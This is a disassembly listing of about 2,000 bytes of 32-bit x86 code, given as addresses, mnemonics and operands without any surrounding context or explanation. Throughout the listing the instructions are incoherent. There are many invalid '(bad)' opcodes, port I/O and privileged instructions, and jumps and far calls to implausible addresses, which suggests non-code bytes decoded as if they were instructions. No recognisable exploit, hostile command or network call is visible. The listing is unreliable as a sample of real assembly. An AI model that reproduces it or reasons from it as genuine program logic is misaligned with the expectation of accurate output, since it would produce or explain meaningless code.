  41452d:	leave  
  41452e:	mov    bl,0x58
  414530:	cmp    DWORD PTR ds:0xf22da069,ebx
  414536:	push   0x1e
  414538:	std    
  414539:	push   edx
  41453a:	push   0xaaf29bc4
  41453f:	or     al,0x48
  414541:	ss jbe 0x414555
  414544:	pop    ebx
  414545:	mov    ebx,0x49fcfa25
  41454a:	sub    al,0x1
  41454c:	push   ds
  41454d:	(bad)  
  41454f:	lahf   
  414550:	inc    ebp
  414551:	push   esi
  414552:	cmp    eax,0x5eefe29c
  414557:	inc    esi
  414558:	in     al,0xb
  41455a:	pop    ss
  41455b:	sahf   
  41455c:	or     ch,BYTE PTR [esi]
  41455e:	clc    
  41455f:	scas   al,BYTE PTR es:[edi]
  414560:	add    al,0x75
  414563:	outs   dx,DWORD PTR ds:[esi]
  414564:	dec    eax
  414565:	cbw    
  414567:	jmp    0x414512
  414569:	xchg   ebx,eax
  41456a:	push   edx
  41456b:	(bad)  
  41456d:	aad    0xbe
  41456f:	dec    edi
  414570:	fsubr  QWORD PTR ds:0x7b232ce6
  414576:	aaa    
  414577:	or     DWORD PTR [esi-0x349936c9],0x23c7c17c
  414581:	test   BYTE PTR [ebp-0xd],bh
  414584:	or     dl,BYTE PTR [ecx]
  414586:	ja     0x41450e
  414588:	mov    eax,0xda7bc10e
  41458d:	jmp    0x42c762e6
  414592:	aas    
  414593:	call   0xe7fb9494
  414598:	xchg   edx,eax
  414599:	and    DWORD PTR [ebp+0xc],0xe2349fb0
  4145a0:	push   0x399830f4
  4145a5:	fisttp DWORD PTR ds:0x32f1580e
  4145ab:	xchg   DWORD PTR [eax],ebp
  4145ad:	inc    ecx
  4145ae:	xchg   ecx,eax
  4145af:	ja     0x414537
  4145b1:	cmp    al,BYTE PTR ds:0xee9fd794
  4145b7:	arpl   WORD PTR [ebx+0x3e],dx
  4145ba:	jmp    0x95646b64
  4145bf:	push   ds
  4145c0:	popf   
  4145c1:	ins    BYTE PTR es:[edi],dx
  4145c2:	mov    DWORD PTR [esi],esi
  4145c4:	fidiv  DWORD PTR [edx]
  4145c6:	sbb    al,0x1d
  4145c8:	test   eax,0x2a157327
  4145cd:	add    al,BYTE PTR ds:0x74871c5d
  4145d3:	pushf  
  4145d4:	cmp    dl,bh
  4145d6:	test   dl,ah
  4145d8:	sti    
  4145d9:	mov    ebp,0x38d86487
  4145de:	jns    0x41456f
  4145e0:	adc    eax,0xa7059b4c
  4145e5:	cdq    
  4145e6:	out    0xc9,eax
  4145e8:	std    
  4145e9:	push   edi
  4145ea:	arpl   WORD PTR [ebx+0x16155489],bp
  4145f0:	jae    0x414585
  4145f2:	imul   edx,DWORD PTR [ecx+ecx*1],0x8ec1b2c3
  4145f9:	(bad)  
  4145fa:	push   ds
  4145fb:	adc    BYTE PTR [ecx+0x24da15a0],bl
  414601:	adc    bh,BYTE PTR [eax]
  414603:	cmp    DWORD PTR [edi-0x33119409],0x3f510af4
  41460d:	jge    0x41467a
  41460f:	in     al,0x84
	...
  414671:	add    BYTE PTR [eax],al
  414673:	add    BYTE PTR [edi+0x5e],bh
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0x14
  414681:	mov    ebp,0xd6f571f8
  414686:	add    BYTE PTR [eax],al
  414688:	add    eax,0xef000001
  41468d:	adc    eax,0x6ea37ddf
  414692:	pop    ebx
  414693:	add    BYTE PTR [esi+0x25bc99c7],ah
  414699:	adc    dl,BYTE PTR [ebx]
  41469b:	push   ss
  41469c:	and    BYTE PTR [ebx-0x58],ah
  41469f:	inc    edx
  4146a0:	loope  0x4146e4
  4146a2:	cli    
  4146a3:	ja     0x4146f7
  4146a5:	dec    esi
  4146a6:	xor    ch,dl
  4146a8:	fimul  WORD PTR [edx]
  4146aa:	or     BYTE PTR [edx+0x5595ac3],0xe4
  4146b1:	mov    al,0xe8
  4146b3:	fcom   DWORD PTR [ebx-0x53]
  4146b6:	cmp    DWORD PTR [ebp-0x76],0xd2d2adf4
  4146bd:	xchg   ebx,eax
  4146be:	push   ds
  4146bf:	aad    0xc
  4146c1:	xor    eax,DWORD PTR [ebx-0x7f]
  4146c4:	cmp    bh,BYTE PTR [esi+edi*8-0x7c]
  4146c8:	mov    ds:0x46453e11,eax
  4146cd:	xchg   ecx,eax
  4146ce:	xor    DWORD PTR [edi],esi
  4146d0:	std    
  4146d1:	test   eax,0xe197419f
  4146d6:	fs (bad) 
  4146d8:	imul   edx,esp,0xb0c8803
  4146de:	loope  0x414685
  4146e0:	cmp    BYTE PTR [ebp-0x6e],dh
  4146e3:	clc    
  4146e4:	pop    edi
  4146e5:	psrld  mm7,QWORD PTR [edx]
  4146e8:	sub    BYTE PTR [ebx+0x409546d1],al
  4146ee:	addr16 loop 0x4146ce
  4146f1:	and    BYTE PTR [ecx+0x12b31209],ch
  4146f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146f8:	mov    edx,DWORD PTR [edi+0x234a6e9f]
  4146fe:	in     al,0xf1
  414700:	jge    0x414762
  414702:	aam    0x69
  414704:	lods   eax,DWORD PTR ds:[esi]
  414705:	and    DWORD PTR [esi],esp
  414707:	xchg   ecx,eax
  414708:	les    edi,FWORD PTR [esp+edx*8-0x248e345e]
  41470f:	cmp    eax,0x392dde85
  414714:	adc    al,0x94
  414716:	xlat   BYTE PTR ds:[ebx]
  414717:	lea    eax,[ebx]
  414719:	es jo  0x414793
  41471c:	sbb    dh,cl
  41471e:	pop    esi
  41471f:	out    dx,eax
  414720:	iret   
  414721:	ins    BYTE PTR es:[edi],dx
  414722:	lods   al,BYTE PTR ds:[esi]
  414723:	cmp    ah,BYTE PTR [ebp+0xf3775b]
  414729:	and    dh,0xf4
  41472c:	pop    ebx
  41472d:	jmp    0x414749
  41472f:	sbb    al,0xd0
  414731:	nop
  414732:	inc    eax
  414733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414734:	mov    ebx,0x671025aa
  414739:	cs jmp 0x414706
  41473c:	or     al,BYTE PTR [edi]
  41473e:	(bad)  
  41473f:	cdq    
  414740:	push   esp
  414741:	loop   0x414739
  414743:	xchg   ebp,esp
  414745:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414746:	(bad)  
  414747:	mov    BYTE PTR [esi+0x2e66f985],cl
  41474d:	leave  
  41474e:	mov    esi,0xbf81aae5
  414753:	adc    al,0x43
  414755:	stos   BYTE PTR es:[edi],al
  414756:	stc    
  414757:	leave  
  414758:	jecxz  0x41476f
  41475a:	sub    ch,al
  41475c:	add    cl,BYTE PTR [ebx+0xe]
  41475f:	iret   
  414760:	cld    
  414761:	dec    ecx
  414762:	sbb    DWORD PTR ds:0xacce23dc,edx
  414768:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414769:	cmp    edi,DWORD PTR [ecx]
  41476b:	ror    DWORD PTR [ebp-0x3c],1
  41476e:	jb     0x4147b1
  414770:	jo     0x414740
  414772:	mov    ebx,0x8b7c06c4
  414777:	pop    edx
  414778:	retf   
  414779:	sahf   
  41477a:	sub    al,0xc1
  41477c:	jecxz  0x414744
  41477e:	inc    ebx
  41477f:	data16 outs dx,BYTE PTR ds:[esi]
  414781:	or     DWORD PTR [eax-0x2],edi
  414784:	scas   eax,DWORD PTR es:[edi]
  414785:	fnstenv [ecx]
  414787:	mov    ah,0xcd
  414789:	cmp    DWORD PTR [ebp-0x66],edi
  41478c:	inc    edx
  41478d:	adc    edx,esp
  41478f:	pushf  
  414790:	xchg   ebp,eax
	...
  4147f1:	add    BYTE PTR [eax],al
  4147f3:	add    BYTE PTR [esi+0x2f],bh
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0x44bf7dcf
  414804:	cli    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    eax,0xb000001
  41480d:	add    al,0x9e
  41480f:	pop    edx
  414810:	jp     0x414855
  414812:	jp     0x4147d9
  414814:	stos   DWORD PTR es:[edi],eax
  414815:	(bad)  
  414816:	lds    ecx,FWORD PTR [ebx+0x16729089]
  41481c:	inc    edi
  41481d:	and    al,0x73
  41481f:	imul   eax,DWORD PTR [eax+ebp*8],0x47
  414823:	outs   dx,DWORD PTR ds:[esi]
  414824:	ret    0x5ee6
  414827:	out    0xd3,al
  414829:	lahf   
  41482a:	mov    ecx,0xe43433b1
  41482f:	jne    0x4148a0
  414831:	es inc edx
  414833:	add    DWORD PTR [ebp+0x6b29b364],ebx
  414839:	add    BYTE PTR [esi],ch
  41483b:	rol    BYTE PTR [edi],0x1a
  41483e:	xchg   ecx,eax
  41483f:	nop
  414840:	repz rcr BYTE PTR [ecx+ebp*2-0x3a5a705b],1
  414848:	sub    DWORD PTR [edi],ebx
  41484a:	push   edx
  41484b:	fisubr WORD PTR [ebx+ebx*2+0x5]
  41484f:	ss cld 
  414851:	frstor [ebx+0x3]
  414854:	jp     0x41481d
  414856:	ins    DWORD PTR es:[edi],dx
  414857:	in     eax,dx
  414858:	repz xchg ebx,eax
  41485a:	mov    al,al
  41485c:	jecxz  0x414888
  41485e:	xchg   esp,eax
  41485f:	cmp    ch,0xf6
  414862:	sbb    BYTE PTR [ebx+0x7],0x9f
  414866:	shr    DWORD PTR [ebp+0x48e68457],cl
  41486c:	xchg   BYTE PTR [ecx+ebx*2-0x24],dh
  414870:	push   ss
  414871:	sbb    bl,ah
  414873:	jl     0x4148de
  414875:	stos   DWORD PTR es:[edi],eax
  414876:	add    BYTE PTR [eax],dl
  414878:	outs   dx,BYTE PTR ds:[esi]
  414879:	pop    ss
  41487a:	out    dx,al
  41487b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41487c:	mov    ebx,DWORD PTR [esi]
  41487e:	fld    TBYTE PTR [ecx+0x15]
  414881:	jg     0x414814
  414883:	or     DWORD PTR [esi],ebx
  414885:	xor    DWORD PTR [ebx-0x24030683],esp
  41488b:	jb     0x41480e
  41488d:	mov    al,0x7e
  41488f:	mov    ebx,0xe4274af3
  414894:	inc    edi
  414895:	push   0x1d
  414897:	push   edx
  414899:	xor    BYTE PTR [ebx-0x5b],bh
  41489c:	push   edi
  41489d:	in     eax,dx
  41489e:	ds jo  0x4148e6
  4148a1:	dec    edx
  4148a2:	xchg   esi,eax
  4148a3:	mov    ebx,0xce4d9b1a
  4148a8:	out    0xe,al
  4148aa:	inc    esi
  4148ab:	mov    eax,ds:0x83a576ac
  4148b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148b1:	cs and eax,0x5c7ddf90
  4148b7:	and    ebp,DWORD PTR [ecx+eiz*1]
  4148ba:	xchg   BYTE PTR [ebp-0x59],bh
  4148bd:	stos   DWORD PTR es:[edi],eax
  4148be:	push   ecx
  4148bf:	dec    esp
  4148c0:	popa   
  4148c1:	cmp    dl,BYTE PTR [eax-0x22753109]
  4148c7:	cmp    DWORD PTR [edx-0x7cd2318a],ebx
  4148cd:	shl    BYTE PTR [edx+eiz*8],1
  4148d0:	push   ecx
  4148d1:	jo     0x4148d0
  4148d3:	cmp    DWORD PTR [ebp-0x6e],edi
  4148d6:	mov    esi,0xdc1bc06d
  4148db:	cmp    ecx,eax
  4148dd:	sti    
  4148de:	(bad)  
  4148df:	aas    
  4148e0:	sbb    al,0xaa
  4148e2:	mov    edi,0xaa118ce1
  4148e7:	mov    edi,0xbd29df7f
  4148ec:	or     al,0xbf
  4148ee:	jge    0x414963
  4148f0:	or     eax,DWORD PTR [edx+0x6c65f25b]
  4148f6:	in     eax,dx
  4148f7:	sbb    esi,DWORD PTR [ebx+edi*8+0x28de7e8]
  4148fe:	arpl   WORD PTR [edx+eax*2+0x2],si
  414902:	xor    al,0xd8
  414904:	outs   dx,DWORD PTR ds:[esi]
  414905:	lahf   
  414906:	cli    
  414907:	sub    BYTE PTR [ecx],bh
  414909:	add    al,0xc5
  41490b:	mov    ebx,0x5bc11d62
  414910:	fadd   DWORD PTR [eax]
	...
  414972:	add    BYTE PTR [eax],al
  414974:	or     edi,DWORD PTR [esi-0x2e]
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	cli    
  414981:	pop    ss
  414982:	jg     0x41498f
  414984:	(bad)  
  414985:	fadd   DWORD PTR [eax]
  414987:	add    BYTE PTR ds:0x61000001,al
  41498d:	push   esi
  41498e:	cwde   
  41498f:	repz xor ecx,ebx
  414992:	mov    dl,0x59
  414994:	int    0xa4
  414996:	cli    
  414997:	push   DWORD PTR [edx+0x9]
  41499a:	cmp    al,0xa0
  41499c:	(bad)  
  41499d:	std    
  41499e:	shl    edx,0xd5
  4149a1:	aas    
  4149a2:	nop
  4149a3:	jge    0x414945
  4149a5:	into   
  4149a6:	cwde   
  4149a7:	push   es
  4149a8:	les    ebx,FWORD PTR [edx+0x48f0d5f4]
  4149ae:	sbb    cl,bh
  4149b0:	mov    cl,0x55
  4149b2:	push   edi
  4149b3:	sub    ebx,0xffffffdb
  4149b6:	xchg   ebx,eax
  4149b7:	xor    ecx,DWORD PTR [eax+esi*4-0x1147bba9]
  4149be:	adc    BYTE PTR [eax+0x4b],cl
  4149c1:	mov    dh,0xda
  4149c3:	fsubr  DWORD PTR [ebp+0x1b]
  4149c6:	push   es
  4149c7:	sbb    BYTE PTR [ebx+edx*2+0x666df8d9],cl
  4149ce:	cmp    bh,BYTE PTR [edx+0x16]
  4149d1:	lock inc eax
  4149d3:	arpl   WORD PTR [ebx],si
  4149d5:	xor    ah,BYTE PTR [edx]
  4149d7:	les    edx,FWORD PTR [ecx]
  4149d9:	xchg   ebp,eax
  4149da:	xchg   esi,eax
  4149db:	push   cs
  4149dc:	mov    cl,0x36
  4149de:	imul   ebx,DWORD PTR [ecx+0x541895df],0xffffffd3
  4149e5:	sbb    BYTE PTR [esi+edx*1],0x51
  4149e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149ea:	dec    eax
  4149eb:	cmp    BYTE PTR [edx-0xd],bh
  4149ee:	push   esi
  4149ef:	adc    BYTE PTR [edi+edi*8-0x66ebfa46],dh
  4149f6:	cmp    ecx,DWORD PTR [edi]
  4149f8:	xchg   edi,eax
  4149f9:	inc    BYTE PTR [ebp-0x13]
  4149fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149fd:	jne    0x414a72
  4149ff:	jp     0x414a5a
  414a01:	push   0x8e361fc8
  414a06:	shl    DWORD PTR [ecx+ebp*8-0x3d],1
  414a0a:	add    al,0xd
  414a0c:	pop    esp
  414a0d:	xchg   DWORD PTR [esi+0x45],edx
  414a10:	pushf  
  414a11:	add    al,0x19
  414a13:	xacquire xchg BYTE PTR [esi-0x5fb6e919],ah
  414a1a:	jae    0x4149e5
  414a1c:	(bad)  
  414a1d:	(bad)  
  414a1e:	ds adc eax,ebp
  414a21:	xchg   esi,eax
  414a22:	push   eax
  414a23:	stc    
  414a24:	scas   al,BYTE PTR es:[edi]
  414a25:	lods   eax,DWORD PTR ds:[esi]
  414a26:	mov    esi,0x7375d4ce
  414a2b:	or     DWORD PTR [ebp-0x24],esp
  414a2e:	dec    esi
  414a2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a30:	std    
  414a31:	mov    edi,0xa0a105a3
  414a36:	mov    edi,0xf41fefca
  414a3b:	mov    al,BYTE PTR [ecx]
  414a3d:	loopne 0x414a6a
  414a3f:	ds push 0x6c
  414a42:	aas    
  414a43:	dec    edx
  414a44:	aam    0x77
  414a46:	mov    cs,WORD PTR [eax]
  414a48:	mov    ebx,0x9cce21a6
  414a4d:	je     0x414a84
  414a4f:	pop    ss
  414a50:	inc    ebp
  414a51:	call   FWORD PTR [edx+0x27ceb0b1]
  414a57:	add    al,0x86
  414a59:	pop    edx
  414a5a:	add    DWORD PTR [edi+0x532a0bd6],esp
  414a60:	xchg   ebx,eax
  414a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a62:	fisub  WORD PTR [ecx-0x5898318b]
  414a68:	dec    esi
  414a69:	adc    dl,ch
  414a6b:	in     eax,0xfd
  414a6d:	inc    esp
  414a6e:	loopne 0x414a0d
  414a70:	mov    bl,0xfd
  414a72:	dec    edx
  414a73:	div    BYTE PTR [edx+eiz*4+0xb7509ff]
  414a7a:	pushf  
  414a7b:	nop
  414a7c:	std    
  414a7d:	(bad)  
  414a7e:	jg     0x414a65
  414a80:	loope  0x414a8b
  414a82:	adc    DWORD PTR [esi],eax
  414a84:	(bad)  
  414a85:	mov    esi,0x6e3fe2d0
  414a8a:	sahf   
  414a8b:	and    cl,0xc3
  414a8e:	lds    ebx,FWORD PTR [ecx+0x7]
	...
  414af1:	add    BYTE PTR [eax],al
  414af3:	add    BYTE PTR [edi+0x7e363ed9],bl
  414af9:	neg    DWORD PTR [edi-0x265c9d07]
  414aff:	arpl   ax,dx
  414b01:	loop   0x414b1e
  414b03:	push   ecx
  414b04:	add    al,0xda
  414b06:	add    BYTE PTR [eax],al
  414b08:	add    eax,0xc4000001
  414b0d:	scas   al,BYTE PTR es:[edi]
  414b0e:	inc    esi
  414b0f:	or     ecx,DWORD PTR [edi+0x2e]
  414b12:	shl    BYTE PTR [eax],cl
  414b14:	lock fisttp QWORD PTR [edx+0x5655ebb1]
  414b1b:	daa    
  414b1c:	push   es
  414b1d:	aad    0x75
  414b1f:	popa   
  414b20:	(bad)
  414b25:	pop    ecx
  414b26:	stos   DWORD PTR es:[edi],eax
  414b27:	jp     0x414b29
  414b29:	xor    edx,DWORD PTR [ebx+0x29]
  414b2c:	jns    0x414abf
  414b2e:	fimul  DWORD PTR [esi-0xd35695a]
  414b34:	hlt    
  414b35:	stos   DWORD PTR es:[edi],eax
  414b36:	int    0xa8
  414b38:	std    
  414b39:	fimul  DWORD PTR [esi+0x2d]
  414b3c:	test   BYTE PTR [ebx-0x27b9fe4b],ch
  414b42:	stos   DWORD PTR es:[edi],eax
  414b43:	imul   edi,DWORD PTR [ecx],0xe19ce2a3
  414b49:	stos   BYTE PTR es:[edi],al
  414b4a:	ja     0x414b65
  414b4c:	vpunpcklbw ymm0,ymm4,YMMWORD PTR [edi-0x26]
  414b51:	(bad)  
  414b52:	push   ecx
  414b53:	mov    BYTE PTR [edx],bh
  414b55:	cmp    al,BYTE PTR [ebx-0x15c1c23]
  414b5b:	dec    edx
  414b5c:	lods   eax,DWORD PTR ds:[esi]
  414b5d:	div    DWORD PTR [ecx]
  414b5f:	pop    es
  414b60:	in     eax,dx
  414b61:	dec    ebx
  414b62:	jmp    0x431fb388
  414b67:	je     0x414bad
  414b69:	out    dx,al
  414b6a:	int3   
  414b6b:	shr    ah,0x3c
  414b6e:	dec    esi
  414b6f:	or     eax,0xc90dc302
  414b74:	adc    al,0xe4
  414b76:	mov    bh,0xf0
  414b78:	pop    DWORD PTR [eax]
  414b7a:	mov    ebx,0x5022c52c
  414b7f:	inc    esp
  414b80:	mov    ebp,DWORD PTR [edi+eiz*4]
  414b83:	js     0x414b8e
  414b85:	add    BYTE PTR [edi],bl
  414b87:	loop   0x414bd7
  414b89:	mov    eax,ds:0xc072b8bb
  414b8e:	sub    DWORD PTR [edi-0x2f],edi
  414b91:	test   eax,0xecee46a1
  414b96:	sbb    edx,DWORD PTR ds:0x78465ca6
  414b9c:	jg     0x414b87
  414b9e:	daa    
  414b9f:	scas   al,BYTE PTR es:[edi]
  414ba0:	lahf   
  414ba1:	mov    DWORD PTR [ecx+0x13],ebp
  414ba4:	sahf   
  414ba5:	sar    dh,cl
  414ba7:	adc    edx,ebx
  414ba9:	adc    bl,dh
  414bab:	and    DWORD PTR [eax*4-0xfc08cbe],eax
  414bb2:	retf   
  414bb3:	and    eax,0xf0c7455a
  414bb8:	ins    DWORD PTR es:[edi],dx
  414bb9:	xchg   DWORD PTR [ebp+0x50642dbd],esp
  414bbf:	mov    gs,WORD PTR [eax-0x575787d1]
  414bc5:	cwde   
  414bc6:	cmp    al,0x5a
  414bc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bc9:	clc    
  414bca:	jno    0x414b8f
  414bcc:	stos   DWORD PTR es:[edi],eax
  414bcd:	stc    
  414bce:	mov    al,ds:0x98dc97aa
  414bd3:	or     al,BYTE PTR [ebp-0x74]
  414bd6:	xchg   BYTE PTR fs:[ebx+ecx*1],ah
  414bda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bdb:	push   ebx
  414bdc:	push   ecx
  414bdd:	xor    ebp,esp
  414bdf:	and    al,0x99
  414be1:	inc    edi
  414be2:	pop    es
  414be3:	inc    ecx
  414be4:	or     eax,0xc7cf537e
  414be9:	popa   
  414bea:	mov    cs,ebx
  414bec:	mov    esp,0xf436171c
  414bf1:	xchg   BYTE PTR [esi],bl
  414bf3:	test   BYTE PTR [edi-0x43],ah
  414bf6:	and    DWORD PTR ss:[ebx],ecx
  414bf9:	gs inc edi
  414bfb:	push   esp
  414bfc:	dec    ecx
  414bfd:	sub    dh,BYTE PTR cs:[eax]
  414c00:	pop    ecx
  414c01:	push   es
  414c02:	inc    edx
  414c03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c04:	cmp    edi,DWORD PTR [edx]
  414c06:	and    bh,0x90
  414c09:	or     DWORD PTR ds:[ebp+0x2fe629c2],ebp
  414c10:	add    BYTE PTR [bx+si],al
	...
  414c73:	add    BYTE PTR [esp+eiz*2],dh
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	adc    edx,DWORD PTR cs:[eax+0x907f919]
  414c85:	fild   DWORD PTR [eax]
  414c87:	add    BYTE PTR ds:0xc9000001,al
  414c8d:	das    
  414c8e:	ret    0xc0e1
  414c91:	mov    edx,0x6ebdb0c9
  414c96:	sbb    al,0x1b
  414c98:	call   0x1f8f:0xd0032b17
  414c9f:	sub    al,0x4f
  414ca1:	clc    
  414ca2:	loopne 0x414c70
  414ca4:	fadd   DWORD PTR [bp+si]
  414ca7:	push   ebp
  414ca8:	(bad)  
  414ca9:	push   ecx
  414caa:	push   ebx
  414cab:	pushf  
  414cac:	sbb    BYTE PTR [ecx],bl
  414cae:	or     dh,BYTE PTR [ebx+0x55]
  414cb1:	pop    esi
  414cb2:	fst    DWORD PTR [eax+ecx*1-0x7a]
  414cb6:	fwait
  414cb7:	mov    cl,0x3d
  414cb9:	mov    edi,0xcda6d975
  414cbe:	mov    ?,edi
  414cc0:	jmp    0x145ece37
  414cc5:	xor    al,0x75
  414cc7:	pop    eax
  414cc8:	call   0xdafc75f6
  414ccd:	retf   
  414cce:	pop    edi
  414ccf:	test   BYTE PTR ds:0x45b7ec4b,ch
  414cd5:	rep lods al,BYTE PTR ds:[esi]
  414cd7:	idiv   ebx
  414cd9:	pop    esp
  414cda:	scas   eax,DWORD PTR es:[edi]
  414cdb:	cdq    
  414cdc:	cmp    DWORD PTR [edi+ecx*4],esi
  414cdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ce0:	ror    dl,0xfe
  414ce3:	cmp    al,0x26
  414ce5:	(bad)  [ecx]
  414ce7:	cmc    
  414ce8:	lds    esp,FWORD PTR [esi+0x12be5e39]
  414cee:	mov    ebp,ecx
  414cf0:	pop    es
  414cf1:	iret   
  414cf2:	lods   al,BYTE PTR ds:[esi]
  414cf3:	out    dx,al
  414cf4:	mov    ecx,0xba7b6bdd
  414cf9:	sbb    al,0x49
  414cfb:	jp     0x414d31
  414cfd:	div    ah
  414cff:	dec    BYTE PTR ds:0x4dfd5930
  414d05:	xchg   edi,eax
  414d06:	jmp    0x414d55
  414d08:	and    ah,BYTE PTR [edx+0x1037e5f1]
  414d0e:	mov    al,ds:0xf422b4a4
  414d13:	pop    ecx
  414d14:	jno    0x414d8d
  414d16:	jmp    0x1ab1d011
  414d1b:	call   0xf898:0x8486d002
  414d22:	hlt    
  414d23:	inc    eax
  414d24:	or     DWORD PTR [ebp+0x84d1289],edi
  414d2a:	xchg   ebp,eax
  414d2b:	push   esi
  414d2c:	mov    eax,ds:0xf3b94ee0
  414d31:	jmp    0xbd2c7cb5
  414d36:	test   eax,0x7fa905f9
  414d3b:	push   es
  414d3c:	in     al,0x34
  414d3e:	ins    DWORD PTR es:[edi],dx
  414d3f:	call   0x6d2b:0x4c52b064
  414d46:	pop    esi
  414d47:	lods   eax,DWORD PTR ds:[esi]
  414d48:	mov    edi,0x3bc6309c
  414d4d:	sbb    DWORD PTR [ebx+ebx*8-0x3b],edx
  414d51:	clc    
  414d52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d53:	cmp    ecx,ebx
  414d55:	repnz scas eax,DWORD PTR es:[edi]
  414d57:	mov    ah,0x0
  414d59:	jno    0x414da0
  414d5b:	imul   ecx,DWORD PTR [ecx+eax*4-0x5f31ec3c],0x0
  414d63:	(bad)  
  414d64:	loope  0x414dae
  414d66:	or     ecx,ebx
  414d68:	xchg   BYTE PTR [ecx+ecx*4+0x35dc4983],cl
  414d6f:	mov    bl,0x2f
  414d71:	cmp    al,0x51
  414d73:	sbb    al,0xe4
  414d75:	sbb    BYTE PTR [ebx-0x6d],ah
  414d78:	inc    ebx
  414d79:	into   
  414d7a:	scas   al,BYTE PTR es:[edi]
  414d7b:	mov    ebp,ebx
  414d7d:	in     eax,dx
  414d7e:	aad    0xc
  414d80:	cmp    BYTE PTR cs:[ebx],bh
  414d83:	cwde   
  414d84:	call   0x5ee0:0x8ed2d478
  414d8b:	rcr    BYTE PTR [eax+0x5c],cl
  414d8e:	pushf  
  414d8f:	cmp    al,0xf5
	...
  414df1:	add    BYTE PTR [eax],al
  414df3:	add    BYTE PTR [edi+0x3e911299],dh
  414df9:	fwait
  414dfa:	mov    bh,0xbf
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0x3764e02c
  414e04:	push   cs
  414e05:	fadd   QWORD PTR [eax]
  414e07:	add    BYTE PTR ds:0x58000001,al
  414e0d:	adc    al,0x40
  414e0f:	mov    BYTE PTR [edx],ah
  414e11:	shl    BYTE PTR [esi-0x11],0xcd
  414e15:	mov    ds:0x6d28ec4d,eax
  414e1a:	out    dx,al
  414e1b:	push   0xffffffd5
  414e1d:	(bad)  
  414e1f:	push   esp
  414e20:	inc    ecx
  414e21:	and    al,0x26
  414e23:	push   ebp
  414e24:	sbb    BYTE PTR [ecx+0x4514b357],0x6
  414e2b:	lods   eax,DWORD PTR ds:[esi]
  414e2c:	adc    DWORD PTR [esi-0x77],esi
  414e2f:	loop   0x414e8b
  414e31:	adc    ebp,DWORD PTR [esi+0x2]
  414e34:	inc    edi
  414e35:	ss push ebp
  414e37:	mul    DWORD PTR [ebp-0x54]
  414e3a:	push   esi
  414e3b:	mov    al,ds:0x3228c752
  414e40:	(bad)  
  414e41:	adc    esi,edi
  414e43:	add    DWORD PTR ds:0x8fc4efbc,ecx
  414e49:	fistp  WORD PTR [esi-0x5569bd53]
  414e4f:	nop
  414e50:	and    dl,BYTE PTR [edi-0x25]
  414e53:	stos   BYTE PTR es:[edi],al
  414e54:	jno    0x414e4c
  414e56:	inc    ebp
  414e57:	ins    BYTE PTR es:[edi],dx
  414e58:	add    eax,0xb603b596
  414e5d:	into   
  414e5e:	nop
  414e5f:	rol    DWORD PTR [edi-0x42cc6bc9],1
  414e65:	add    BYTE PTR [edx-0x67],0xa7
  414e69:	lea    eax,[edx]
  414e6b:	in     eax,dx
  414e6c:	mov    eax,ds:0x4fc46336
  414e71:	lock or DWORD PTR fs:[edi],0xffffff8c
  414e76:	shl    DWORD PTR [eax],1
  414e78:	cld    
  414e79:	cmp    al,0x18
  414e7b:	fucomp st(1)
  414e7d:	sub    BYTE PTR [edi+0x178be37d],bl
  414e83:	sbb    al,0x3
  414e85:	xor    eax,0x5900da27
  414e8a:	aas    
  414e8b:	nop
  414e8c:	jg     0x414e84
  414e8e:	jp     0x414ebe
  414e90:	pop    es
  414e91:	nop
  414e92:	pop    es
  414e93:	lds    ebx,FWORD PTR [esp+ecx*4-0x3]
  414e97:	in     eax,dx
  414e98:	cwde   
  414e99:	jne    0x414e22
  414e9b:	adc    BYTE PTR [eax],0x8b
  414e9e:	fdivp  st(7),st
  414ea0:	add    bl,bl
  414ea2:	mov    al,0x39
  414ea4:	push   esi
  414ea5:	popa   
  414ea6:	mov    edx,DWORD PTR [ecx+0x29]
  414ea9:	clc    
  414eaa:	or     al,cl
  414eac:	inc    ebx
  414ead:	sub    cl,al
  414eaf:	xlat   BYTE PTR ds:[ebx]
  414eb0:	sti    
  414eb1:	popf   
  414eb2:	arpl   WORD PTR [ebp-0x29fdfbc3],si
  414eb8:	aas    
  414eb9:	(bad)  [ebp+0x2a]
  414ebc:	bound  eax,QWORD PTR [ebp-0x4a6548c1]
  414ec2:	and    eax,0x68a6d793
  414ec7:	fs dec ebp
  414ec9:	in     eax,0x29
  414ecb:	jne    0x414e7d
  414ecd:	xchg   ebx,eax
  414ece:	imul   edi,DWORD PTR [edx+ecx*4],0x4b43bd42
  414ed5:	out    dx,al
  414ed6:	pushf  
  414ed7:	pop    edx
  414ed8:	jmp    0x3485d997
  414edd:	add    DWORD PTR [ecx+0x7558c710],ebx
  414ee3:	(bad)  
